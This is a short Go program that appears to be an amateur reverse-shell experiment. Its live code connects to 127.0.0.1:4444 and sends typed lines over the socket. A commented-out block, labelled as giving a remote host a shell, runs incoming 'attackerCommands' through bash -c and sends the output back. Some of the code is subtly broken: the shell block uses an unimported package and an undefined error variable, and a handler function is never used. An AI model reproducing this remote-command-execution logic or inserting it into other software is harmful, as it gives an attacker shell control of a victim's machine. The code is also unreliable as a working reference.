package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"time"
)

func main() {
	c, _ := net.Dial("tcp", "127.0.0.1:4444") //net.Dial is used to connect to the remote server
	//listener
	for {
		/* Get user input verified by os.Stdin */
		reader := bufio.NewReader(os.Stdin)
		fmt.Print(">> ")
		text, _ := reader.ReadString('\n')
		fmt.Fprintf(c, text+"\n")
	}

	//COMMANDS TO GIVE REMOST HOST A SHELL
	/*
		for {
			attackerCommands, _ := bufio.NewReader(c).ReadString('\n')
			cmd := exec.Command("bash", "-c", attackerCommands)
			if err != nil {
				log.Fatalln(err)
			}
			out, _ := cmd.CombinedOutput()

			c.Write(out)
		} */
}

func handleIncomingConnection(conn net.Conn) {
	// store incoming data
	buffer := make([]byte, 1024)
	_, err := conn.Read(buffer)
	if err != nil {
		log.Fatal(err)
	}
	// respond
	time := time.Now().Format("Monday, 02-Jan-06 15:04:05 MST")
	conn.Write([]byte("Hi back!\n"))
	conn.Write([]byte(time))

	// close conn
	conn.Close()
}
